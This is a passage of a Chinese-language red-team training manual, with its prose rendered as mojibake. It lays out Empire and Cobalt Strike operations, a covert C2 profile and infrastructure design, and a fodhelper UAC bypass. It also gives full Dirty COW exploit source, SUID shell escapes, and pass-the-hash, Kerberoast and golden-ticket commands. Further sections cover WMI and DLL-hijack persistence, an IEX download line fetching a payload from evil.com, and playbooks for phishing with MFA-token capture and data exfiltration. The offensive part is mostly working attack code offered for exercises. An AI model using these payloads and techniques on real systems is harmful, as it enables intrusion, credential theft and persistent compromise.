# Empireæ¡†æ¶ä½¿ç”¨
"""
# å®‰è£…Empire
git clone https://github.com/EmpireProject/Empire.git
cd Empire
./setup/install.sh
./empire

# åˆ›å»ºç›‘å¬å™¨
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.1.100
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

# ç”ŸæˆLauncher
(Empire: listeners) > launcher powershell http
(Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

# åæ¸—é€æ¨¡å—
(Empire: agents) > usemodule privesc/powerup/allchecks
(Empire: agents) > usemodule credentials/mimikatz/logonpasswords
(Empire: agents) > usemodule lateral_movement/invoke_psremoting
"""
```

**æ··æ·†æŠ€æœ¯**:
```powershell
# Invoke-Obfuscationå·¥å…·
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# åŠ è½½è„šæœ¬
SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Tokenæ··æ·†
TOKEN
ALL
1

# å­—ç¬¦ä¸²æ··æ·†
STRING
1

# ç¼–ç æ··æ·†
ENCODING
1

# æŸ¥çœ‹æ··æ·†ç»“æœ
OUT obfuscated.ps1
```

#### Cobalt Strikeä½¿ç”¨

**Beaconé…ç½®**:
```bash
# å¯åŠ¨å›¢é˜ŸæœåŠ¡å™¨
./teamserver [external IP] [password] [/path/to/malleable-c2-profile]

# Malleable C2 Profileé…ç½®
set sample_name "Custom Profile";

set sleeptime "60000";
set jitter    "20";

http-get {
    set uri "/api/v1/status";

    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Accept" "application/json";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";

        output {
            base64url;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

http-post {
    set uri "/api/v1/update";

    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Content-Type" "application/json";

        id {
            base64url;
            prepend "{\"id\":\"";
            append "\",";
        }

        output {
            base64url;
            prepend "\"data\":\"";
            append "\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            base64url;
            prepend "{\"response\":\"";
            append "\"}";
            print;
        }
    }
}
```

#### C2åŸºç¡€è®¾æ–½è“å›¾
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   å¤–éƒ¨åŸºç¡€è®¾æ–½ (Cloud / VPS)                â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚   â”‚ Redirector A â”‚-->| CDN / WAF / NLB  â”‚----â”â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚â”‚
â”‚                â”‚            â”‚                â”‚â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚â”‚
â”‚   â”‚ Redirector B â”‚   â”‚ Redirector C â”‚        â”‚â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚â”‚
â”‚                â”‚            â”‚                â”‚â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
                 â”‚            â”‚                 â”‚
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
       â”‚ å†…éƒ¨C2æ ¸å¿ƒ (Team Server/VPS)   â”‚<â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚  - æ­£å¼Beaconç›‘å¬ç«¯å£         â”‚
       â”‚  - æ“ä½œå‘˜VPN/Jumpä¸»æœº         â”‚
       â”‚  - æ—¥å¿—ä¸è¯æ®å­˜å‚¨             â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
      â”‚ æ“ä½œå‘˜å·¥ä½œç«™ (OPSEC)â”‚
      â”‚  - éš”ç¦»ç½‘ç»œ         â”‚
      â”‚  - å¤šå› å­è®¤è¯       â”‚
      â”‚  - å·¥å…·ç™½åå•       â”‚
      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**è®¾è®¡åŸåˆ™**ï¼š
- ä½¿ç”¨å¤šè·³åå‘ä»£ç†ä¸CDNéšè—çœŸå®C2åœ°å€ï¼Œç»“åˆåŸŸå‰ç½®æˆ–SNIä¼ªè£…ï¼›
- Redirector ä¸æ ¸å¿ƒC2åˆ†ç¦»ï¼Œå‡ºç°å°ç¦å¯å¿«é€Ÿæ›¿æ¢ï¼›
- é€šè¿‡WireGuard/OpenVPNç®¡ç†å¹³é¢è®¿é—®ï¼Œæ‰€æœ‰å‘½ä»¤ç»ç”±å ¡å’æœºå®¡è®¡ï¼›
- C2æœåŠ¡é‡‡ç”¨å®¹å™¨åŒ–æˆ–åŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆTerraform/Ansibleï¼‰å¿«é€Ÿéƒ¨ç½²ä¸é”€æ¯ï¼›
- å»ºç«‹â€œæ“ä½œå‘˜æ‰‹å†Œâ€ï¼šåŒ…æ‹¬ä¸Šçº¿å®¡æ‰¹ã€å‘½ä»¤å®¡æ‰¹ã€è¯æ®åŒæ­¥ã€å›æ»šæ­¥éª¤ã€‚

**åæ¸—é€æ“ä½œ**:
```bash
# Beaconå‘½ä»¤
beacon> shell whoami
beacon> getuid
beacon> ps
beacon> screenshot

# æƒé™æå‡
beacon> elevate svc-exe tcp-local
beacon> getsystem

# å‡­è¯è·å–
beacon> hashdump
beacon> logonpasswords
beacon> mimikatz !sekurlsa::logonpasswords

# æ¨ªå‘ç§»åŠ¨
beacon> jump psexec target.com LISTENER
beacon> jump winrm target.com LISTENER
beacon> remote-exec psexec target.com whoami

# æŒä¹…åŒ–
beacon> run persistence
beacon> schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System

# éš§é“å»ºç«‹
beacon> socks 1080
beacon> rportfwd 8080 127.0.0.1 80
```

### 2.3 æƒé™æå‡

#### Windowsæƒé™æå‡

**UACç»•è¿‡æŠ€æœ¯**:
```powershell
# fodhelper.exe UACç»•è¿‡ï¼ˆWin10ï¼‰
function Invoke-FodhelperBypass {
    param([String]$Command)

    # åˆ›å»ºæ³¨å†Œè¡¨é¡¹
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force

    # è§¦å‘UACç»•è¿‡
    Start-Process "C:\Windows\System32\fodhelper.exe"

    # æ¸…ç†ç—•è¿¹
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# ä½¿ç”¨ç¤ºä¾‹
Invoke-FodhelperBypass -Command "powershell.exe -NoP -W Hidden -Exec Bypass -File C:\backdoor.ps1"
```

**æœåŠ¡æƒé™æ»¥ç”¨**:
```powershell
# PowerUpæšä¸¾
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# å¯æ»¥ç”¨çš„æœåŠ¡ç±»å‹
function Find-VulnerableServices {
    # 1. UnquotedæœåŠ¡è·¯å¾„
    Get-WmiObject -Class Win32_Service | Where-Object {
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.StartMode -eq 'Auto'
    } | Select-Object Name, PathName, StartMode, State

    # 2. å¯å†™æœåŠ¡äºŒè¿›åˆ¶
    Get-ServiceUnquoted | Where-Object {
        Test-Path $_.Path -PathType Leaf
    } | ForEach-Object {
        $acl = Get-Acl $_.Path
        if ($acl.Access | Where-Object {
            $_.FileSystemRights -match 'Write|FullControl' -and
            $_.IdentityReference -match 'Users|Everyone'
        }) {
            $_.Name
        }
    }

    # 3. å¯ä¿®æ”¹æœåŠ¡é…ç½®
    Get-Service | ForEach-Object {
        $svc = $_
        $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
        if ($acl.Access | Where-Object {
            $_.RegistryRights -match 'Write|FullControl' -and
            $_.IdentityReference -match 'Users|Everyone'
        }) {
            $svc.Name
        }
    }
}

# åˆ©ç”¨unquotedæœåŠ¡è·¯å¾„
# æœåŠ¡è·¯å¾„: C:\Program Files\Vulnerable Service\service.exe
# å°è¯•åˆ›å»º: C:\Program.exe
Copy-Item backdoor.exe "C:\Program.exe"
Restart-Service VulnerableService
```

#### Linuxæƒé™æå‡

**å†…æ ¸æ¼æ´åˆ©ç”¨**:
```bash
#!/bin/bash
# Dirty COW (CVE-2016-5195) åˆ©ç”¨è„šæœ¬

# æ£€æŸ¥å†…æ ¸ç‰ˆæœ¬
uname -r
# æ˜“å—å½±å“ç‰ˆæœ¬: Linux 2.6.22 - 4.8.3

# ç¼–è¯‘exploit
cat > dirtycow.c << 'EOF'
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str = (char *)arg;
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 100000000; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    pthread_create(&pth1, NULL, madviseThread, argv[2]);
    pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF

gcc -pthread dirtycow.c -o dirtycow
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
```

**SUIDæ»¥ç”¨**:
```bash
# æŸ¥æ‰¾æ‰€æœ‰SUIDç¨‹åº
find / -perm -4000 -type f 2>/dev/null

# GTFOBinsæ»¥ç”¨ç¤ºä¾‹
# vim SUIDææƒ
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# find SUIDææƒ
find . -exec /bin/sh -p \; -quit

# nmap SUIDææƒï¼ˆæ—§ç‰ˆæœ¬ï¼‰
nmap --interactive
!sh

# python SUIDææƒ
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl SUIDææƒ
perl -e 'exec "/bin/sh";'

# awk SUIDææƒ
awk 'BEGIN {system("/bin/sh")}'
```

### 2.4 æ¨ªå‘ç§»åŠ¨

#### Pass-the-Hashæ”»å‡»

**Impacketå·¥å…·é›†**:
```bash
# ä½¿ç”¨NTLMå“ˆå¸Œè¿›è¡Œæ¨ªå‘ç§»åŠ¨

# PsExec
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# WMIExec
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# SMBExec
smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# AtExecï¼ˆè®¡åˆ’ä»»åŠ¡ï¼‰
atexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10 "whoami"

# DCOMExec
dcomexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# æå–å“ˆå¸Œ
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
```

**CrackMapExecæ‰¹é‡æ”»å‡»**:
```bash
# å®‰è£…CrackMapExec
pipx install crackmapexec

# æ‰¹é‡å¯†ç å–·æ´’
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!'

# Pass-the-Hashæ‰¹é‡
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# æ‰¹é‡æ‰§è¡Œå‘½ä»¤
crackmapexec smb 192.168.1.0/24 -u administrator -H hash -x "whoami"

# æå–SAM
crackmapexec smb 192.168.1.10 -u administrator -H hash --sam

# æå–LSA Secrets
crackmapexec smb 192.168.1.10 -u administrator -H hash --lsa

# æšä¸¾å…±äº«
crackmapexec smb 192.168.1.0/24 -u administrator -H hash --shares

# æšä¸¾ç™»å½•ç”¨æˆ·
crackmapexec smb 192.168.1.0/24 -u administrator -H hash --lusers

# æ¨¡å—ä½¿ç”¨
crackmapexec smb 192.168.1.10 -u administrator -H hash -M mimikatz
crackmapexec smb 192.168.1.10 -u administrator -H hash -M lsassy
```

#### Kerberosæ”»å‡»

**Kerberoasting**:
```powershell
# PowerViewæšä¸¾SPNè´¦æˆ·
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# è¯·æ±‚æœåŠ¡ç¥¨æ®
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.com:1433"

# å¯¼å‡ºç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::list /export"'

# ç¦»çº¿ç ´è§£
# ä½¿ç”¨Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# ä½¿ç”¨Impacket
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.com/user:password

# Hashcatç ´è§£
hashcat -m 13100 hashes.txt wordlist.txt
```

**Golden Ticketæ”»å‡»**:
```powershell
# 1. æå–krbtgtå“ˆå¸Œ
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.com /user:krbtgt"'

# 2. è·å–åŸŸSID
Get-ADDomain | Select-Object DomainSID

# 3. ç”ŸæˆGolden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt"'

# 4. éªŒè¯è®¿é—®
dir \\dc\c$
```

**Silver Ticketæ”»å‡»**:
```powershell
# ç”Ÿæˆç‰¹å®šæœåŠ¡ç¥¨æ®
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:machine_ntlm_hash /ptt"'

# è®¿é—®ç›®æ ‡æœåŠ¡
dir \\server\c$
```

### 2.5 æŒä¹…åŒ–æŠ€æœ¯

#### WindowsæŒä¹…åŒ–

**WMIäº‹ä»¶è®¢é˜…**:
```powershell
# åˆ›å»ºWMIæŒä¹…åŒ–
$FilterArgs = @{
    name='SystemBootFilter'
    EventNameSpace='root\CimV2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    name='SystemBootConsumer'
    CommandLineTemplate='powershell.exe -NoP -W Hidden -Exec Bypass -enc <base64_payload>'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs

# æ¸…ç†WMIæŒä¹…åŒ–ï¼ˆç”¨äºæµ‹è¯•åæ¸…ç†ï¼‰
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='SystemBootConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

**DLLåŠ«æŒ**:
```c
// æ¶æ„DLLæ¨¡æ¿
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // æ‰§è¡Œæ¶æ„ä»£ç 
            system("powershell.exe -enc <base64_payload>");

            // åŠ è½½åŸå§‹DLLï¼ˆé¿å…ç¨‹åºå´©æºƒï¼‰
            LoadLibrary("C:\\Windows\\System32\\original_dll.dll");
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// å¯¼å‡ºåŸDLLçš„æ‰€æœ‰å‡½æ•°ï¼ˆä½¿ç”¨.defæ–‡ä»¶ï¼‰
/*
LIBRARY malicious_dll
EXPORTS
    Function1=original_dll.Function1
    Function2=original_dll.Function2
*/

// ç¼–è¯‘
// x86: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /DEF:exports.def
// x64: cl /LD /D_USRDLL /D_WINDLL malicious.cpp /link /MACHINE:X64 /DEF:exports.def
```

### 2.6 çº¢é˜Ÿæ”»å‡»å‰§æœ¬åº“ï¼ˆPlaybook Libraryï¼‰

> æ‰€æœ‰å‰§æœ¬ä»…ç”¨äºæˆæƒæ¼”ç»ƒï¼Œè¯·åœ¨éš”ç¦»ç¯å¢ƒä¸­ç»ƒä¹ ã€‚

#### å‰§æœ¬ #RT-001ï¼šé’“é±¼ â†’ VPN å‡­è¯æ»¥ç”¨ â†’ å†…ç½‘æ¸—é€
| é˜¶æ®µ | ç›®æ ‡ | å·¥å…·/å‘½ä»¤ | äº§å‡º | å®‰å…¨é˜ˆå€¼ |
| --- | --- | --- | --- | --- |
| Recon | æ”¶é›†ç»„ç»‡é‚®ç®±æ ¼å¼ã€æŠ€æœ¯æ ˆ | `theHarvester -d corp.com -b linkedin` | é‚®ç®±åˆ—è¡¨ã€èŒä½ä¿¡æ¯ | ä¸ä¸»åŠ¨è§¦è¾¾ç›®æ ‡èµ„äº§ |
| Weaponize | åˆ¶ä½œé’“é±¼é¡µé¢ã€å‡­è¯è½¬å‘ | Gophishã€Evilginx2 | é’“é±¼ç«™ç‚¹ã€SSLè¯ä¹¦ | é’“é±¼åŸŸåä¸ç”Ÿäº§åŸŸåç›¸ä¼¼åº¦æ§åˆ¶ <80% |
| Delivery | æ‰¹é‡å‘é€ä¸ªæ€§åŒ–é‚®ä»¶ | Gophishæ´»åŠ¨ | å‘ä¿¡æ—¥å¿—ã€æ‰“å¼€ç‡ | å•æ‰¹æ¬¡ä¸è¶…è¿‡50å° |
| Exploit | æ•è·å‡­è¯ + MFA Token | Evilginx2æ—¥å¿— | æœ‰æ•ˆç™»å½•å‡­è¯ | é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°<3 |
| Installation | ä½¿ç”¨å‡­è¯ç™»å½•VPN | `openvpn --config corp.ovpn --auth-user-pass creds.txt` | VPNä¼šè¯æ—¥å¿—ã€IP | ç™»å½•åç«‹å³é€šçŸ¥ç™½é˜Ÿ |
| C2 | éƒ¨ç½²Beacon | `beacon.exe` / `powershell -enc ...` | å—æ§ä¸»æœº | Beaconå¿ƒè·³é—´éš”â‰¥60s |
| Action | æ¨ªå‘æ¸—é€ã€æ•°æ®è®¿é—® | BloodHoundã€CrackMapExecã€Rubeus | å‡­è¯ã€æ‹“æ‰‘ã€æ•°æ®åŒ… | å¯¹æ•æ„Ÿæ•°æ®åº“ä»…åªè¯» |

**å…³é”®æ—¥å¿—æ ·ä¾‹**ï¼š
```
2024-04-12 10:21:33 [phish] Email opened by alice@corp.com
2024-04-12 10:21:45 [phish] Credential submitted: alice@corp.com / ********
2024-04-12 10:22:06 [evilginx] Captured MFA token: 123456
2024-04-12 10:22:50 [vpn] New connection from 45.77.x.x user alice
```

**å›æ»šè®¡åˆ’**ï¼š
1. ç»ˆæ­¢VPNä¼šè¯ï¼›
2. æäº¤å‡­è¯é‡ç½®æ¸…å•ï¼›
3. åˆ é™¤é’“é±¼ç«™ç‚¹ã€é”€æ¯C2å®ä¾‹ï¼›
4. æ›´æ–°æ¼”ç»ƒè¯æ®ã€‚

#### å‰§æœ¬ #RT-002ï¼šWebæ¼æ´é“¾ â†’ å†…ç½‘è·³æ¿ â†’ æ•°æ®æ¸—å‡º
| æ­¥éª¤ | æ“ä½œ | å‘½ä»¤/è„šæœ¬ | é¢„æœŸç»“æœ |
| --- | --- | --- | --- |
| 1. ä¿¡æ¯æ”¶é›† | ç¡®è®¤Webç»„ä»¶ä¸æ¡†æ¶ | `whatweb -a 3 portal.corp.com` | è¯†åˆ«åˆ°Struts2ç»„ä»¶ |
| 2. æ¼æ´åˆ©ç”¨ | åˆ©ç”¨CVE-2017-5638æ‰§è¡Œå‘½ä»¤ | `python exploit.py --url https://portal.corp.com --cmd "whoami"` | æ‹¿åˆ°WebShell |
| 3. æƒé™æå‡ | æŸ¥æ‰¾æ•æ„Ÿé…ç½® | `grep -R "password" /opt/app/conf` | è·å–æ•°æ®åº“è´¦æˆ· |
| 4. å†…ç½‘é€è§† | é€šè¿‡æ•°æ®åº“æœåŠ¡å™¨æ¨ªå‘ | `sshpass -p 'Passw0rd' ssh db@10.10.20.5` | è¿›å…¥å†…ç½‘ |
| 5. å‡­è¯æ”¶é›† | Mimikatz/Seatbelt | `Invoke-Mimikatz -Command "sekurlsa::logonpasswords"` | åŸŸå‡­è¯ |
| 6. æ¨ªå‘ç§»åŠ¨ | PsExec/WMI | `wmiexec.py domain/admin:hash@10.10.20.10` | è¿›å…¥æ–‡ä»¶æœåŠ¡å™¨ |
| 7. æ•°æ®æ¸—å‡º | å‹ç¼©å¹¶ä¼ å‡º | `7z a finance.7z /data/finance/*.xls` + `powershell Invoke-WebRequest` | æ•°æ®æ ·æœ¬ |

**éšè”½æªæ–½**ï¼šä½¿ç”¨`netsh interface portproxy`æ­å»ºè½¬å‘ã€`certutil -encode`ä¼ªè£…payloadã€åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€æ§åˆ¶æ•°æ®å¤§å°<10MBå¹¶åˆ†ç‰‡ã€‚

#### å‰§æœ¬ #RT-003ï¼šäº‘ç¯å¢ƒæ”»é™·ï¼ˆAWSï¼‰
1. è·å–å‡­è¯ï¼šåœ¨Gitæ³„éœ²ä»“åº“ä¸­æ‰¾åˆ°`AWS_ACCESS_KEY_ID`ä¸`AWS_SECRET_ACCESS_KEY`ã€‚
2. èº«ä»½éªŒè¯ï¼š`aws sts get-caller-identity --profile compromised`ã€‚
3. æƒé™æšä¸¾ï¼š`aws iam list-attached-user-policies --user-name compromised-user`ã€‚
4. èµ„æºæ¢ç´¢ï¼š`aws s3 ls`ã€`aws ec2 describe-instances`ã€`aws lambda list-functions`ã€‚
5. æƒé™æå‡ï¼š`aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name RedTeamSession`ã€‚
6. æŒä¹…åŒ–ï¼šåˆ›å»ºçŸ­æœŸTokenæˆ–Access Keyï¼ˆéœ€ç™»è®°ï¼‰ï¼Œè®¾ç½®CloudTrailå‘Šè­¦ã€‚
7. æ¸…ç†ï¼šåˆ é™¤å¤šä½™èµ„æºï¼Œç”±ç™½é˜Ÿæ ¸å¯¹CloudTrailæ—¥å¿—ã€‚

#### å‰§æœ¬ #RT-004ï¼šå·¥æ§/OTåœºæ™¯ï¼ˆä»¿çœŸï¼‰
| ç¯èŠ‚ | ç›®æ ‡ | æ“ä½œ | æ³¨æ„äº‹é¡¹ |
| --- | --- | --- | --- |
| ITä¾§æ¸—é€ | è¿›å…¥å ¡å’æœºæˆ–MESç³»ç»Ÿ | Webæ¼æ´/é’“é±¼ | ä½¿ç”¨ä»¿çœŸç¯å¢ƒï¼Œç¦æ­¢å½±å“ç”Ÿäº§ |
| OTç½‘ç»œé€è§† | è¯†åˆ«PLCå·¥ç¨‹ç«™ | `nmap -sU -p 502,20000 10.60.0.0/24` | ä»…å¯¹ä»¿çœŸç«™ç‚¹æ‰«æï¼Œå¹¶æå‰å¤‡æ¡ˆ |
| åè®®åˆ†æ | Modbus/TCPè¯»å–çº¿åœˆ | `python modbus-read.py --host 10.60.0.10 --addr 1 --count 10` | ç¦æ­¢å†™å‘½ä»¤ã€æ“ä½œå‰ç¡®è®¤ |
| æ•°æ®å–è¯ | å¯¼å‡ºå·¥è‰ºå›¾çº¸ | åªè®¿é—®æ•™å­¦ç”¨æ–‡ä»¶å¤¹ | å¿…é¡»æœ‰ç°åœºå·¥ç¨‹å¸ˆé™ªåŒ |

### 2.7 çº¢é˜ŸçŸ¥è¯†åº“å»ºè®¾
- å»ºç«‹`/redteam/playbooks`ä»“åº“ï¼ŒæŒ‰ç…§`å¹´ä»½-åœºæ™¯`å‘½åå¹¶ç»´æŠ¤CHANGELOGã€‚
- æ¯ä¸ªå‰§æœ¬åŒ…å«ï¼šç›®æ ‡èƒŒæ™¯ã€å‰ææ¡ä»¶ã€æ“ä½œæ­¥éª¤ã€å‘½ä»¤ã€é£é™©ã€æ£€æµ‹å‡è®¾ã€å›æ»šæ–¹æ¡ˆã€‚
- ä¸è“é˜ŸåŒæ­¥â€œæ£€æµ‹å‡è®¾â€éƒ¨åˆ†ï¼Œä¾¿äºå¯¹é½é¢„æœŸå‘Šè­¦ç‚¹ã€‚
- å®šæœŸå¤ç›˜å‰§æœ¬æ•ˆæœï¼Œæ ‡è®°â€œæˆåŠŸ/å¤±è´¥/éœ€ä¼˜åŒ–â€ï¼Œå½¢æˆç‰ˆæœ¬å†å²ã€‚

---

## æ¨¡å—ä¸‰ï¼šè“é˜Ÿé˜²å¾¡ä½“ç³»

### æ¨¡å—æ€»è§ˆï¼ˆè“é˜Ÿè§†è§’ï¼‰
- **å…³é”®ç›®æ ‡**ï¼šæ„å»ºæ¶µç›–æ£€æµ‹ã€å“åº”ã€å¤ç›˜ã€æ”¹è¿›çš„é—­ç¯ä½“ç³»ï¼Œå®ç°å¯¹çº¢é˜ŸTTPçš„é«˜è¦†ç›–ã€é«˜å‘½ä¸­ä¸ä½è¯¯æŠ¥ã€‚
- **èƒ½åŠ›è¦ç´ **ï¼š
  - **æ£€æµ‹å·¥ç¨‹ï¼ˆDetection Engineeringï¼‰**ï¼šåŸºäºMITRE & ATT&CKè¦†ç›–ç‡è®¾è®¡è§„åˆ™ã€ä»ªè¡¨æ¿ã€‚
  - **å¨èƒç‹©çŒï¼ˆThreat Huntingï¼‰**ï¼šå‡è®¾é©±åŠ¨ã€æ•°æ®é©±åŠ¨ã€æƒ…æŠ¥é©±åŠ¨ä¸‰ç§æ¨¡å¼å¹¶è¡Œã€‚
  - **åº”æ€¥å“åº”ï¼ˆIRï¼‰**ï¼šNISTæµç¨‹ã€Playbookã€è‡ªåŠ¨åŒ–ç¼–æ’ï¼ˆSOARï¼‰ã€‚
  - **å–è¯åˆ†æ**ï¼šå†…å­˜/ç£ç›˜/ç½‘ç»œ/æ—¥å¿—å¤šç»´å–è¯èƒ½åŠ›ã€‚
- **æ¨¡å—äº§å‡º**ï¼š
  - æ£€æµ‹è§„åˆ™åº“ï¼ˆSigma/YARA/EDRè‡ªå®šä¹‰è§„åˆ™ï¼‰
  - SOCè¿è¡Œæ‰‹å†Œã€å‘Šè­¦åˆ†çº§æ ‡å‡†ã€å€¼ç­æ’ç­è¡¨
  - Threat Hunting æŠ¥å‘Šæ¨¡æ¿ä¸è‡ªåŠ¨åŒ–è„šæœ¬
  - äº‹ä»¶å¤ç›˜æŠ¥å‘Šã€è¡ŒåŠ¨é¡¹è·Ÿè¸ªè¡¨

#### è“é˜Ÿèƒ½åŠ›é›·è¾¾å›¾ï¼ˆè‡ªè¯„ï¼‰
| èƒ½åŠ›é¡¹ | 1åˆ† | 3åˆ† | 5åˆ† |
| --- | --- | --- | --- |
